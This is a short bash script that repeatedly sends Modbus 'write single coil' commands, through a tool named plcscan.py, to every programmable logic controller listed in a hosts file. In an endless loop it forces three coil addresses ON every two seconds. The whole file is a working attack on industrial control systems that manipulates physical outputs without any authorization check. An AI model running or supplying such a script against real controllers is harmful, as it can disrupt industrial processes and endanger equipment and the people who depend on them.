#!/bin/bash



for (( ; ; ))
do
   echo "infinite loops [ hit CTRL+C to stop]"
   sudo python plcscan.py --modbus-function=5 --modbus-data='\x00\x64\xFF\x00' --hosts-list="hosts.txt" --timeout=5 
   sleep 2
   sudo python plcscan.py --modbus-function=5 --modbus-data='\x00\x60\xFF\x00' --hosts-list="hosts.txt" --timeout=5 
   sleep 2
   sudo python plcscan.py --modbus-function=5 --modbus-data='\x00\x62\xFF\x00' --hosts-list="hosts.txt" --timeout=5 
   sleep 2
done